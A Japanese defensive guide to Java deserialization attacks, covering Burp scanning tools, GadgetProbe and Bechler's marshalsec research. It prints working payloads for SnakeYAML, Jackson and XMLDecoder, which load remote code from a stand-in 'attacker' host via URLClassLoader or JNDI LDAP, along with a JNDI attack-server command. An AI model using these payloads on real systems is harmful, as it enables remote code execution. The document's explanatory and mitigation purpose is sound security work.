- Apache Commons Collections 3系／4系
- Spring Framework
- Java 6/7/8 標準ライブラリのみで完結するチェーン
- Hibernate 5
- JSON系ライブラリ（Jackson等の設定不備を利用するもの）
- Rome、Javassist/Weld、JBoss Interceptors、Mozilla Rhino、Vaadin

対応エンコーディングはRaw、Base64、Ascii Hex、GZIP、Base64+GZIPの5種類で、対象アプリがシリアライズデータをどう transport しているか（生バイナリか、Base64文字列としてパラメータに埋め込むか、gzip圧縮しているか）に応じて選択します。

#### 実務上の注意（防御目線）

このツール自体は攻撃ペイロードを生成・送信するため、本番環境や許可のない対象に対して用いることは決してあってはなりません。防御側としての正しい使い方は、自組織が管理する検証環境やCTF/学習用ラボ、あるいは正式な許可を得たペネトレーションテスト対象に限定し、検出されたシグナル（DNSコールバックやタイミング遅延）を「パッチ適用の優先度付け」や「WAF/RASPルールの検証」に使うことです。またこのリポジトリは2019年前後を最後に更新が止まっており、後述のPortSwigger版が保守を引き継いでいる点に注意してください。

### Java Deserialization Scanner（PortSwiggerフォーク）

> 出典: Java Deserialization Scanner (PortSwigger BApp fork) — https://github.com/PortSwigger/java-deserialization-scanner

これはfedericodotta版と機能・検出原理はほぼ同一の、PortSwigger（Burp Suite開発元）が管理を引き継いだフォークです。BApp Store（Burpの拡張機能マーケットプレイス）から公式に配布・アップデートされているのが最大の違いで、元開発者が個人リポジトリの更新を止めた後も、Burp本体のAPI変更への追従やバグ修正が継続されています。

検出手法（時間ベース／DNSベース／CPUベース）、対応ガジェットチェーン（Commons Collections 3/4、Spring、Java 6/7/8、Hibernate 5、JSON、Rome、Commons BeanUtils、Javassist/Weld、JBoss Interceptors、Mozilla Rhino、Vaadinなど13種類）、5種のエンコーディング対応は元版と共通です。UI構成も「受動/能動スキャン統合」「Manual testing」「Exploiting（ysoserial連携）」の3タブ構成を踏襲しています。

実務では、Burp Suite Professional利用者はBApp StoreからこのPortSwigger版を導入するのが標準的な選択肢になります。GitHub上のソースからビルドしたfedericodotta版を使う理由は、主に「BApp Store未掲載の最新コミットを試したい」「独自の改造を加えたい」といったケースに限られます。両者は分岐元が同じため、ペイロード生成ロジックや検出原理を理解する上では区別する必要はほぼありません。

### GadgetProbe（盲目的クラスパス探索）

> 出典: GadgetProbe — https://github.com/BurpsuiteExtensions/GadgetProbe

GadgetProbeは、上記2つのツールとは目的のレイヤーが異なります。上記2つは「ガジェットチェーンが最後まで実行されコードが動くか」を検証するツールでしたが、GadgetProbeは一歩手前の段階、すなわち「そもそも対象のクラスパスにどんなライブラリ（とバージョン）が載っているか」を、ガジェットチェーンなしで調べるためのツールです。

#### 盲目的クラスパス探索の仕組み

任意のガジェットチェーンが動作するには、そのチェーンを構成する全クラスが対象のクラスパス上に存在しなければなりません。しかし対象がどのライブラリ・バージョンを使っているかは、通常はエラーメッセージやスタックトレースが返らない限り分かりません（＝「ブラインド」な状態）。GadgetProbeは、この「特定の1クラスが存在するかどうか」だけを、コード実行を伴わずに1件ずつ確認する手法を取ります。

具体的には、次のような仕組みです。

1. `java.io.ObjectInputStream`は、シリアライズされたバイトストリームを読み込む際、まず該当するクラス名をクラスローダで解決しようとします（`resolveClass()`）。指定されたクラス名がクラスパス上に存在しなければ`ClassNotFoundException`が送出され、その時点で処理は失敗に終わります。
2. 存在する場合、Javaはそのクラスのフィールドを順に復元しようとします。GadgetProbeは、探索したいクラス（例: `org.apache.commons.collections.functors.InvokerTransformer`）を「フィールドとして内包する、外側のオブジェクト」を仕込んだシリアライズデータを生成します。この外側のオブジェクトは、実行されると`InetAddress.getByName()`のようなDNSルックアップを行うよう設計されています。
3. つまり「対象クラスの解決に成功する」→「外側のラッパーの処理が最後まで進む」→「DNSクエリが発生する」という因果関係を作り、DNSクエリの有無だけを観測してクラスの存在を判定します。クエリが届かなければ、そのクラスは存在しない（か、途中で例外が発生した）と判断できます。

これを1クラスずつ、あるいはワードリスト（既知のガジェットチェーンで使われるクラス名のリストが同梱されています)全体に対して繰り返すことで、対象のクラスパスに載っているライブラリ群を「地図化」できます。ツールにはシグネチャ機能もあり、複数クラスの存在パターンから特定バージョンのライブラリを絞り込むことも可能です。

#### Burp Intruderとの統合

GadgetProbeはBurp Intruderのペイロードプロセッサとして動作するよう設計されています。典型的な使い方は次の通りです。

1. デシリアライズされていそうなリクエスト（パラメータにBase64文字列や`rO0AB`のような先頭文字列が見えるものなど）をIntruderに送る
2. 攻撃位置（ペイロード挿入ポイント）を、シリアライズデータ全体に設定する
3. ペイロードリストとして同梱のクラス名ワードリストを指定し、GadgetProbeのペイロードプロセッサをアタッチする（プロセッサが各クラス名を、DNSコールバック付きのシリアライズオブジェクトへと自動変換してくれる）
4. 攻撃を実行し、Burp Collaborator側で受信したDNSクエリのサブドメイン（クエリごとに一意な識別子が埋め込まれる）を、拡張の専用結果タブで突き合わせて「どのクラス名の探索でヒットしたか」を確認する

#### Java APIとしての利用

GUIだけでなく、Javaライブラリとして組み込んで使うこともできます。ドキュメントに示されている典型的な呼び出しは次のような形です。

```java
GadgetProbe gp = new GadgetProbe("callback.domain");
Object obj = gp.getObject("org.apache.commons.collections.functors.InvokerTransformer");
```

このAPIは、指定したコールバック用ドメイン（DNS OOBサーバのホスト名）と、探索対象のクラス完全修飾名を受け取り、DNSコールバック付きのシリアライズ済みオブジェクトを生成します。これを独自のスキャナやCIパイプラインに組み込むことで、Burp GUIを介さない自動化された「クラスパス棚卸し」も実現できます。

ビルドはGradle（`gradlew`）で行い、`shadowJar`タスクによって依存関係を1つのJARにまとめた上で、付属スクリプトを実行してワードリストを生成する構成になっています。対応言語はJava 8以上です。

#### なぜこの手法が「安全な」検出として重要なのか

GadgetProbeはガジェットチェーン全体を実行させるわけではなく、あくまで「単一クラスの解決に成功するか」だけを見ています。理論上、対象が実際に危険なコード実行に至るには、探索でヒットした複数クラスがさらに正しい順序・正しいフィールド構成で連結される必要があります。つまりGadgetProbeの結果は「攻撃が成立する」ことの証明ではなく、「攻撃が成立し得る材料（ライブラリ）が揃っているか」を示す偵察情報です。この性質上、Java Deserialization Scannerのようなアクティブなコード実行検証ツールに比べ、対象環境への影響が限定的で、防御側の資産棚卸し（インベントリ）用途としても比較的安全に使いやすいという特徴があります。

### 3ツールの位置づけの整理

| ツール | 主目的 | 検出原理 | 対象への影響度 |
|---|---|---|---|
| Java Deserialization Scanner (federicodotta) | ガジェットチェーンの検出・悪用（PoC実行） | シグネチャ／タイミング／DNS／CPU負荷 | 高（実際にRCEペイロードを送信し得る） |
| Java Deserialization Scanner (PortSwigger) | 同上（公式保守版） | 同上 | 高 |
| GadgetProbe | クラスパスの偵察（存在確認のみ） | 単一クラス解決の成否をDNS OOBで観測 | 中〜低（コード実行までは行わない） |

診断の現場では、まずGadgetProbeでクラスパスを偵察し、狙えそうなライブラリの存在を確認したうえで、Java Deserialization Scannerで実際にそのガジェットチェーンが機能するか（タイミングやDNSコールバックで）検証する、という段階的なアプローチが理にかなっています。これによって、いきなり破壊的・不確実な実行系ペイロードを送るのではなく、確度の低い段階から確度の高い段階へと検証を積み上げることができます。

### 防御側の視点からの補足

これらのツールが利用する検出シグナル（マジックバイト`AC ED 00 05`の出現、`rO0AB`で始まるBase64、未知ドメインへのDNSクエリ、異常なレスポンス遅延）は、そのまま自組織のWAFやIDS/IPS、あるいはアプリケーションログの監視ルールとしても転用できます。特に「アプリケーションサーバから外部への予期しないDNSクエリ」は、ガジェットチェーンによる攻撃の初期兆候として非常に強いシグナルであり、DNSエグレスの監視・制限（許可リスト化)は、たとえパッチ適用が完了していない資産があっても、実害（RCE成立)を防ぐための有効な多層防御になります。また、これらのツールがそもそも検出対象とする「信頼できない入力に対する`readObject()`の直接呼び出し」自体を、`ObjectInputFilter`（Java 9以降で標準化、Java 8にもバックポートあり）によるクラス許可リスト化で塞ぐことが、根本対策として最も確実です。

## marshalsecとアンマーシャラのセキュリティ研究

Javaのデシリアライゼーション（直列化されたバイト列をオブジェクトに復元する処理）が引き起こすRCE（Remote Code Execution、遠隔コード実行）は、2015年のChris FrohoffとGabriel Lawrenceの研究以降、Java史上最大級の脆弱性の波を生んだ。しかしその後、こうした攻撃は「Java標準のシリアライゼーション（`java.io.Serializable`）だけの問題なのか？」という疑問が残った。この問いに正面から答えたのが、Moritz Bechlerによる論文 **Java Unmarshaller Security（2017年5月22日）** と、それに付随するツール **marshalsec** である。

本節では、marshalsecが何を明らかにし、どのような仕組みで多数のマーシャリングライブラリを横断的に攻撃できるのかを、防御者の視点で解説する。ここで扱う知識は「なぜ許可リスト（whitelist）による型制限が唯一の本質的な対策なのか」を理解するための土台になる。

> **本節のスコープ**: 本節は防御・設計監査を目的とした技術解説である。実在するサービスや本番環境に対する無許可の検証、破壊的な手順、ラボ攻略の具体的手順は扱わない。ペイロード例は「なぜ危険なのか」を理解するための原理説明に限る。

### marshalsecとは何か

marshalsec（`https://github.com/mbechler/marshalsec`）は、Bechlerが論文の主張を実証するために公開した**ペイロードジェネレータ集**である。ysoserial（Java標準シリアライゼーション用のガジェット生成ツール）のマーシャラ版に相当し、SnakeYAML・XStream・Jackson・Kryo・Hessian など各種ライブラリ向けに、それぞれの形式（YAML文字列、XML、JSON、バイナリなど）でRCEを引き起こすペイロードを生成する。加えて、後述するJNDI攻撃を成立させるための小さな攻撃用サーバ（LDAP/RMIのリファレンスサーバ）を同梱する。

論文の核心的な主張は次の一文に集約される。

> オブジェクトへのアンマーシャリングは常に、ある種のコード実行である。攻撃者にあなたの知らないコードを呼び出させた瞬間、それはあなたが望まない場所へ連れて行く可能性が非常に高い。

つまり「攻撃者が復元先の型（type）を自由に指定できる」時点で、そのライブラリはほぼ確実に悪用可能だ、という一般法則である。この節を通じて、なぜそう言い切れるのかを見ていく。

> 出典: mbechler/marshalsec（GitHubリポジトリ） — https://github.com/mbechler/marshalsec

### 前提となる用語とツール

- **マーシャリング / アンマーシャリング**: 論文はJava標準のシリアライゼーションと混同を避けるため、「内部表現（オブジェクトグラフ）を転送・保存可能な表現に変換する任意の仕組み」を総称してマーシャリングと呼ぶ。逆変換がアンマーシャリング。攻撃者が入力を制御しやすいのは**アンマーシャリング側**なので、本研究の主眼はそこにある。
- **オブジェクトグラフ**: 復元されるオブジェクト同士の参照関係のネットワーク。ネストしたプロパティやコレクションの要素も含む。
- **ガジェット / ガジェットチェーン**: 攻撃者が直接コードを書くのではなく、**すでにクラスパス上に存在するクラス**の副作用を数珠つなぎにして最終的にコード実行へ到達させる手法。個々の踏み台クラスをガジェット、その連鎖をガジェットチェーンと呼ぶ。
- **sink（シンク）**: 入力が最終的に実行・解釈される危険な到達点。marshalsecの文脈では `Runtime.exec()`、`URLClassLoader` によるリモートクラスロード、JNDIルックアップなどがシンクにあたる。

ガジェット探索には、Bechler自身が開発した静的バイトコード解析ツール **Serianalyzer**（`https://github.com/mbechler/serianalyzer/`）を拡張して用いている。Serianalyzerは「初期メソッドの集合」から出発し、ネイティブメソッド（Javaで実際のシステム操作を行うには必ずネイティブメソッドを経由する）への到達可能性を追跡する。初期メソッド集合を各マーシャラの挙動（後述するsetter呼び出しや`hashCode()`呼び出しなど）に合わせて調整することで、Java標準シリアライゼーション以外の仕組みにも適用できる。

### なぜ「任意型の指定」がそのまま脆弱性になるのか

アンマーシャリングでは通常、ルート（最上位）オブジェクトの期待型は分かっている。受け取ったデータで何かをしたいのだから当然だ。この期待型から**リフレクション**でプロパティの型を再帰的に決定すれば、攻撃者は勝手な型を差し込めない。

ところが多くの実装は、Javaの継承・インタフェースによる**多態性（polymorphism）**を許すために、表現の中に型情報を埋め込み、それに従ってオブジェクトを復元する。この設計が致命的だ。攻撃者に任意型の指定を許すと、その型のオブジェクトに対して**一定範囲のメソッド呼び出し**（コンストラクタ、setter、getter、`hashCode()`/`equals()`/`compareTo()` など）を発火させられる。「そのメソッドはお行儀よく振る舞うはずだ」という暗黙の期待こそが、攻撃者の付け入る隙になる。

論文が挙げた「デフォルトで任意型のアンマーシャリングを許す（または過去に許していた）」主要OSSライブラリは次の通り。

| ライブラリ | 形式 | 値の設定方式 |
|---|---|---|
| SnakeYAML | YAML | Beanプロパティ（public） |
| jYAML | YAML | Beanプロパティ |
| YamlBeans | YAML | Beanプロパティ |
| Apache Flex BlazeDS | AMF | Beanプロパティ |
| Red5 IO AMF | AMF | Beanプロパティ |
| json-io | JSON | フィールド直接 |
| Castor | XML | Beanプロパティ |
| Java XMLDecoder | XML | 任意メソッド/コンストラクタ |
| Java Serialization | バイナリ | フィールド直接 |
| Kryo | バイナリ | フィールド直接 |
| Hessian/Burlap | バイナリ/XML | フィールド直接 |
| XStream | XML/各種 | フィールド直接 |
| Jackson | JSON | Beanプロパティ（多態モード時のみ危険） |

一方、**構造的に安全な例外**として、JAXB（使用する型の事前登録が必要）、スキーマ定義やコンパイルを要する機構（XmlBeans、JiBX、Protobuf）、GSON（ルート型を要求し多態には登録が必要）、GWT-RPC（自動で許可リストを構築）が挙げられている。この対比が重要だ。**安全なライブラリはすべて「型を明示的に選別する」機構を持っている**。

### 2つの大分類: Beanプロパティ型とフィールド型

論文は、値の設定方式で全ライブラリを2群に分ける。この分類が、どのガジェットが刺さるかを決める。

#### Beanプロパティ型マーシャラ

JavaBean規約（`getXyz()`/`isXyz()`/`setXyz()`）に従ってプロパティを設定する。型のAPIを尊重するため復元できるオブジェクトグラフは限定的だが、**setterを呼ぶ＝アンマーシャリング中に多くのコードが直接発火する**という危険を抱える。SnakeYAML、jYAML、YamlBeans、BlazeDS、Red5、Castor、Jacksonがこれに属する。

##### SnakeYAML

最も攻撃面が広い例。SnakeYAMLはpublicコンストラクタとpublicプロパティのみを許す（getterは不要）が、`!!`タグにより**任意のコンストラクタを攻撃者データで呼べる**特殊機能を持つ。これが`ScriptEngineManager`経由のRCEを可能にする。

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker/"]
  ]]
]
```

**なぜこれで実行に至るか**: `ScriptEngineManager`のコンストラクタは、渡された`ClassLoader`に対して`ServiceLoader`機構で`javax.script.ScriptEngineFactory`の実装を探す。リモートのクラスパス（`http://attacker/`）に置かれた`META-INF/services/javax.script.ScriptEngineFactory`が指すクラスがインスタンス化されるため、攻撃者のクラスが標準ライブラリのみで実行される（後述4.16）。

プロパティアクセスだけでも`JdbcRowSetImpl`が使える。

```yaml
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: ldap://attacker/obj
  autoCommit: true
```

**なぜこれで実行に至るか**: `dataSourceName`にJNDIのURIを、続いて`autoCommit`を設定すると、`JdbcRowSetImpl`は`connect()`を呼び、その中で`InitialContext.lookup()`を攻撃者のJNDI URIに対して発行する。これがJNDIリファレンス攻撃（後述）のトリガになる。順序が重要で、2つのsetterが正しい順で呼ばれる必要がある。

**緩和策**: SnakeYAMLには全カスタム型を禁じる`SafeConstructor`が付属する。あるいはカスタム`Constructor`実装で許可リストを実装できる。

##### Jackson

Jacksonはデフォルトでは**厳格な実行時型チェック**（コレクションのジェネリック型も含む）を行い任意型を許さないため、標準設定では安全である。ただし多態アンマーシャリングを有効化するモードがあり、その中には**Javaクラス名を使う**ものがある。危険になるのは以下いずれかを行ったとき。

- `ObjectMapper.enableDefaultTyping()`（グローバル有効化）
- カスタム`TypeResolverBuilder`
- フィールドへの`@JsonTypeInfo`

この状態では、`readValue()`がスーパタイプを使う、あるいはネストしたフィールド/コレクションがそうした型を持つ場合に悪用が可能になる。ペイロード例。

```json
["com.sun.rowset.JdbcRowSetImpl", {
  "dataSourceName": "ldap://attacker/obj",
  "autoCommit": true
}]
```

**バージョン依存の重要な注意**: この`JdbcRowSetImpl`経路はJackson 2.7.0未満では動かない。Jacksonは同一プロパティ（`matchColumn`）に複数の競合するsetterがあるかを検査し、`JdbcRowSetImpl`はこのプロパティに3つのsetterを持つため弾かれるからだ。2.7.0でこの解決ロジックが追加されたが、そのロジックにバグがあり、`Class.getMethods()`の返す順序（ほぼランダム）次第で本来失敗すべき検査が通ってしまう。なお`JdbcRowSetImpl`が塞がれても、Jacksonは`SpringPropFac`、`SpringBFAdv`、`C3P0RefDS`、`C3P0WrapDS`、`RMIRemoteObj`で確実に悪用できる。

**緩和策**: 多態を使うなら`@JsonTypeInfo`で`JsonTypeInfo.Id.NAME`を指定し、許容するサブタイプを明示列挙する（＝名前ベースの許可リスト）。

##### Castor・Java XMLDecoder

Castorはpublicデフォルトコンストラクタを要求し、`addXYZ(Object)`や`createXYZ()`といった追加のアクセサも発火させる。プリミティブ型プロパティが常にオブジェクト型より先に設定されるという癖があり、これが`JdbcRowset`の悪用を阻む（`dataSourceName`（文字列）を`autoCommit`（プリミティブ）より先に設定できないため）。代わりに`SpringBFAdv`や`C3P0WrapDS`が使える。

`java.beans.XMLDecoder`は「完全性のために」触れられているが、任意型に対する任意メソッド・任意コンストラクタ呼び出しを許すため極めて危険である。

```xml
<new class="java.lang.ProcessBuilder">
  <string>/usr/bin/gedit</string><method name="start"/>
</new>
```

**緩和策**: XMLDecoderに関する論文の助言は明快だ。「絶対に信頼できるデータ以外には、決して、絶対に使うな」。

#### フィールド型マーシャラ

setterを介さずフィールドを直接書き換える。メソッド呼び出しという意味では攻撃面が狭い（コンストラクタすら呼ばずに復元するものもある）。しかし privateフィールドを直接触るため副作用が生じやすく、より広範なオブジェクトグラフを復元できてしまう。さらに、コレクションなどはランタイム表現のまま効率的に転送できないので、各ライブラリは特定型向けの**カスタムコンバータ**を同梱する。このコンバータが攻撃者オブジェクトに対して`hashCode()`・`equals()`・`compareTo()`（ソート済みコレクションの場合）を呼ぶことが、フィールド型のガジェット発火点になる。Kryo、Hessian/Burlap、json-io、XStream、そしてJava標準シリアライゼーション自身がこの群だ。

##### Kryo

Kryoはデフォルトではpublicデフォルトコンストラクタを要求しプロキシも非対応で、多くの既知ガジェットを封じている。しかしインスタンス化戦略が差し替え可能で、`org.objenesis.strategy.StdInstantiatorStrategy`にすると`ReflectionFactory`ベースになり、**カスタムコンストラクタを呼ばずに**（ただし`java.lang.Object`のコンストラクタは呼ぶ）オブジェクトを生成できてしまう。デフォルトコンストラクタ要件という一見些細な制約が、悪用可能なガジェット数を大きく左右する好例である。ソート済みコレクションと`Comparator`のサポートにより`BeanComparator`（BeanComp）が適用でき、代替戦略を使えば`ServiceLoader`、`BindingEnumeration`、`ImageIO`など標準ライブラリのみのガジェットも一気に開放される。

**緩和策**: Kryoは全使用型の**事前登録**を要求する設定にできる（ただしセキュリティ目的の機能ではなく、全システムで登録順序を揃える必要があるなどの副作用がある）。

##### Hessian/Burlap

Hessian/Burlapは`sun.misc.Unsafe`による副作用のないインスタンス化を使い、transientフィールドを復元せず、任意プロキシやカスタムコレクションComparatorも非対応と、防御的に見える。**しかし致命的な実装バグがある**: `java.io.Serializable`のチェックを一見行うように見えて、そのチェックは**マーシャリング時にしか適用されず、アンマーシャリング時には適用されない**。もしこのチェックがアンマーシャリング時に効いていれば、他の制約を通り抜ける悪用可能なオブジェクトグラフの大半は復元できなかったはずだ。この非対称性のため、非SerializableのSpringCompAdvやResin、SerializableなROMEやXBeanで悪用できる。

**緩和策**: バージョン4.0.51で`ClassFactory`による許可リストのオプションサポートが追加された。

##### json-io

json-ioはほぼ任意のコンストラクタを呼ぶ。2つの特徴が悪用の鍵。**Brute-Force-Construction**（デフォルトコンストラクタがないと、null/デフォルト値で他のコンストラクタを成功するまで試す）と、**Two-Stage-Reconstruction**（`hashCode()`に依存するコレクションは他オブジェクトの後に、予期しない順序で復元される）。標準ライブラリの`TemplatesImpl`もSpringの`DefaultListableBeanFactory`も復元できるため、一部ガジェットで直接バイトコード実行が可能。ルート型は指定できない。

**緩和策**: 型許可リストを実装する明確な方法がなく、メンテナは応答なし（論文執筆時点）。

##### XStream

XStreamに対する警告と攻撃は以前から多数あった（2013年のDinis Cruzらによる`java.beans.EventHandler`攻撃、2016年のArshan DabirsiaghiによるGroovy攻撃など）。XStreamはできる限り多くのオブジェクトグラフを許そうとし、デフォルトコンバータは「強化版Java Serialization」とも言える。最初の非Serializable親コンストラクタ呼び出しを除けば、**Java SerializationでできることはほぼすべてXStreamでもできる**（プロキシ構築を含む）。しかも型が`java.io.Serializable`を実装している必要すらない。marshalsecはここで、プロキシを使わない標準ライブラリのみの新しい経路（ServiceLoader、ImageIO、LazySearchEnum、BindingEnum）を提示した。

**緩和策**: XStreamは`TypePermission`による型フィルタリングを手厚くサポートし許可リストを構築できる。次のメジャーバージョンでは許可リストがデフォルトで有効になる予定（論文執筆時点の見通し）。

> 出典: Java Unmarshaller Security — Turning your data into code execution（Moritz Bechler, 2017） — https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf

### 共通のシンク: コード実行に至る2つの道

論文はライブラリ横断で使える「最終シンク」を整理している。理解の要はここだ。

#### Xalan TemplatesImpl — 攻撃者バイトコードの直接定義

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`（およびupstreamの`org.apache.xalan.xsltc.trax.TemplatesImpl`）は、特定メソッド呼び出し時に**攻撃者が供給したJavaバイトコードからクラスを定義・初期化できる**という稀有な能力を持つ。トリガは`newTransformer()`、public な`getOutputProperties()`、private な`getTransletInstance()`など。

**バージョン依存の重要点**: JDK版はJava 8u45以降、コード実行に至る前にtransientな`_tfactory`フィールドを参照する。そのため使用可能な状態で復元するには「transientフィールドを設定できる」「任意コンストラクタを呼べる」「`readObject()`を呼ぶアンマーシャラである」のいずれかが必要。upstream版にはこの制約がない。必要なフィールドのsetterはprivate/protectedなので、フィールド型マーシャラか、非publicなsetterを呼べるBean型マーシャラでしか使えない。

#### JNDIリファレンスによるコード実行 — 本研究の中心的シンク

marshalsecの多くのガジェットは、最終的に**JNDIルックアップ**へ帰着する。仕組みを段階的に説明する。

JNDI（Java Naming and Directory Interface）はディレクトリ経由でオブジェクトにアクセスする。RMIとLDAPは、ネイティブJavaオブジェクトをディレクトリ経由で取得でき、それらはJava Serializationで転送される。両者ともオブジェクトが**自分のクラスをどのコードベース（URL）から読むか**を指定できる。この危険な機能はさすがに長らくデフォルト無効だ。

しかしJNDIには**リファレンス機構**がある。JNDIに格納されたオブジェクトが「私は別の場所から読み込むべきだ」と示せる仕組みで、`javax.naming.spi.ObjectFactory`（オブジェクトを生成/取得するファクトリ）を指定できる。そしてこのファクトリクラスを読み込むコードベースには**何の制限もない**。攻撃の流れはこうだ。

1. アプリが攻撃者の制御する`name`引数で`InitialContext.lookup()`を呼ぶ。
2. これが攻撃者のサーバへの接続を発生させる。
3. サーバはリファレンスを返す。そこにはオブジェクトファクトリ名と、攻撃者の制御するコードベースURLが含まれる。
4. デフォルトのJNDI実装は、そのコードベースで`URLClassLoader`を構築し、指定されたファクトリクラスを読み込み・初期化する（該当コードは`javax.naming.spi.NamingManager.getObjectInstance()`）。
5. 攻撃者のコードが実行される。

**修正状況（時事性）**: Java 8u121でようやくこのコードベース制限が追加された。**ただしRMIに対してのみ**であり、LDAPは論文執筆時点で未対応だった（後にJava 8u191/11.0.1でLDAPにも制限が入る）。重要なのは、RMIの制限がかかっても`ContinuationContext`を復元できれば**ネットワークの迂回すら省ける**点、そしてコードベース制限を回避されてもJava Serialization自体へエスカレーションできてしまう点だ。marshalsecはこの攻撃を成立させるため、`marshalsec.jndi.LDAPRefServer`と`marshalsec.jndi.RMIRefServer`という2つのリファレンスサーバを同梱している（下記は研究環境での仕組み確認用の起動形式）。

```text
java -cp target/marshalsec-<VERSION>-SNAPSHOT-all.jar \
  marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]
```

> 出典: mbechler/marshalsec（GitHubリポジトリ、JNDIサーバ含む） — https://github.com/mbechler/marshalsec

### 代表的ガジェットチェーンの仕組み

同じJNDIシンクへ、様々な「発火の引き金」から到達できる点がガジェットチェーンの本質だ。いくつか原理を示す。

#### JdbcRowSetImpl（4.2）

標準ライブラリ。`Serializable`実装・デフォルトコンストラクタ・getterあり。前述の通り`dataSourceName`→`autoCommit`の2つのsetterで`connect()`→`InitialContext.lookup()`に至る。setter駆動のBean型マーシャラ（SnakeYAML、jYAML、Red5、Jackson）に刺さる、最も直接的なガジェット。

#### ServiceLoader$LazyIterator（4.3）

標準ライブラリ。`Serializable`でなくデフォルトコンストラクタもsetterもない。`URLClassLoader`を復元でき、内部クラスのインスタンスを扱えるフィールド型マーシャラ（Kryo代替戦略、XStream）向け。仕組みは、`LazyIterator`を`URLClassLoader`とともに作り、`Iterator.next()`を呼ぶと**リモートのサービス定義を読み込み、リモートコードベースの指定クラスをインスタンス化**する。`next()`を発火させる引き金として、`ServiceLoader`で`Iterable`に変換して反復させる、あるいはコレクション反復を返すモックプロキシ（Java 8u71以前は標準の`AnnotationInvocationHandler`で構築可能）を使う。さらに論文は、プロキシを一切使わない標準ライブラリのみの連鎖（`NativeString.hashCode()`→`Base64Data.toString()`→`CipherInputStream`経由で`Cipher.update()`→任意`Iterator`の参照）も示している。

#### BindingEnumeration（4.4）/ LazySearchEnumerationImpl（4.5）

いずれも標準ライブラリで、4.3のiteratorトリガを使い、`Enumeration.next()`経由でJNDI/RMIルックアップ（4.4）や、`ContinuationDirContext`経由でリモートコードベースのクラス初期化（4.5）に至る。4.4はJNDI/RMIに限られるため**u121以降は直接のコード実行には使えなくなった**（コードベース制限のため）。

#### C3P0 WrapperConnectionPoolDataSource（4.9）

c3p0が必要。`Serializable`・デフォルトコンストラクタ・getterあり。**1つのsetterで実行に至る**強力なガジェット。`userOverridesAsString`プロパティを設定するとコンストラクタで登録された`PropertyChangeEvent`リスナが発火し、値の一部を（先頭22文字と末尾を除いて）16進デコードしてJavaデシリアライズする。復元されたオブジェクトが`IndirectlySerialized`を実装していれば`getObject()`が呼ばれ、`ReferenceIndirector$ReferenceSerialized`がリモートクラスパスからJNDI ObjectFactoryとしてクラスをインスタンス化する。Bean型・フィールド型の広範なマーシャラに適用できる汎用性が特徴。

#### BeanComparator（4.17）/ ROME EqualsBean・ToStringBean（4.18）

いずれもFrohoffが公開した既知のJavaシリアライゼーションガジェットで、marshalsecはこれをKryoやXStreamにも転用する。BeanComparatorは、カスタム`Comparator`を持つソート済みコレクションに対象オブジェクトを2つ挿入すると、`property`で指定したgetterが両者に対して呼ばれる仕組み。`databaseMetaData`プロパティ経由で`TemplatesImpl`や`JdbcRowset`を発火できる。ROMEは`EqualsBean.hashCode()`→`ToStringBean.toString()`→`beanClass`の全getter呼び出し、という連鎖で同じシンクに到達する。**同一のガジェットが複数のマーシャラで再利用できる**ことこそ、この問題がライブラリ横断的である証左だ。

#### ScriptEngineManager（4.16）

標準ライブラリのみ。任意コンストラクタを攻撃者データで呼べる能力（SnakeYAMLが該当）が前提。`URL`→`URLClassLoader`→`ScriptEngineManager`とネストして構築すると、コンストラクタが`ScriptEngineFactory`の`ServiceLoader`機構を起動し、リモートクラスパスの任意クラスをインスタンス化する。外部依存を一切必要としないため、SnakeYAMLに対する定番の実証手段となった。

### アンマーシャリング後にも危険は続く: 「再」シリアライゼーション

論文の第5章は、アンマーシャリング完了後の危険を扱う。復元されたオブジェクトグラフが型チェックを通過しても、その後の処理で悪用が起こりうる。

- **マーシャリング時のgetter呼び出し（5.1）**: Bean型マーシャラは、グラフ内の全オブジェクトの全getterを呼ぶ。よって、あるアンマーシャラで復元したオブジェクトを別の仕組みで**マーシャリング**すると、新たなメソッド群が発火する。例: `TemplatesImpl.getOutputProperties()`でバイトコード実行、`JdbcRowSetImpl.getDatabaseMetaData()`でJNDIルックアップ、`SignedObject.getObject()`で供給データのJavaデシリアライズ。
- **Java「再」シリアライゼーション（5.2）**: 多くのサーブレットコンテナは、セッションをページアウトする際にオブジェクトグラフをシリアライズし、ページインで復元する。この passivation が、初期化コード（`afterPropertiesSet()`や`readObject()`）を後から発火させ、本来到達しない攻撃経路を開くことがある。spring-txの`JtaTransactionManager`がその例。

これらは「復元さえ通れば安全」という思い込みを崩す。**アンマーシャリングを通した後もオブジェクトは信頼できない**。

### 結論と防御 — なぜ許可リストだけが本質的対策なのか

論文の結論は、防御設計に直結する重要な洞察を含む。

1. **これらの仕組みはそもそも公開APIに向かない**。Javaの型情報を運ぶことで実装詳細を露出するからだ。しかしそれでも、ほぼ全ライブラリで主要プロジェクトへの悪用可能な用例が見つかり、多くが致命的な脆弱性となった。
2. **Javaだけの問題ではない**。C#のJson.NETの`TypeNameHandling`も同種の攻撃対象になりうる。Javaはフラットなクラスパス構造と巨大な標準ライブラリ、そして「一見無害なAPIでRCEに至るエンタープライズ機能（JNDI）」を抱えるため、攻撃面が特に広い。
3. **フィールド型とBean型でガジェットの重複は少ないが、危険度は同等**。決め手は「悪用に使える型がどれだけクラスパス上にあるか」であり、可視性・コンストラクタ要件・実行時型情報がそれを制約する。
4. **`java.io.Serializable`による「意図の宣言」は失敗した**。理由は複数ある。同一インタフェースが passivation（透過的復元を望む）とデータ転送（副作用最小化を望む）という相反する目的を兼ねること、インタフェース継承ゆえに全サブタイプに宣言が強制されること、そして「安全かどうか」の判断を全体像を見ていない者に押し付けること。あるコードベースで安全に見えるものが、別のコードベースでの複雑な相互作用によって突然悪用可能になる。
5. **commons-collectionsやgroovyが個々のガジェットを「修正」したのは誤り**だった。根本問題（型が無制限に復元されること）を残したまま、多数の悪用可能インスタンスを放置したからだ。しかも本論文が扱う多くの仕組みでは、そもそも「型が自分自身のアンマーシャリングを拒否する」手段が存在しないため、この種の緩和は実装すらできない。

したがって唯一の適切な修正は、**復元可能な型を既知の良性なものだけに制限すること**である。手段は次のいずれか、または組み合わせ。

- **明示的な許可リスト（whitelist）**: 復元してよい型を列挙する。
- **ルート型からの実行時型情報による制限**: 期待型が判明するまでアンマーシャリングを遅延させ、フィールド/プロパティ/コレクションの型を根から完全にチェックする。多態を完全には扱えないが、有効な緩和。
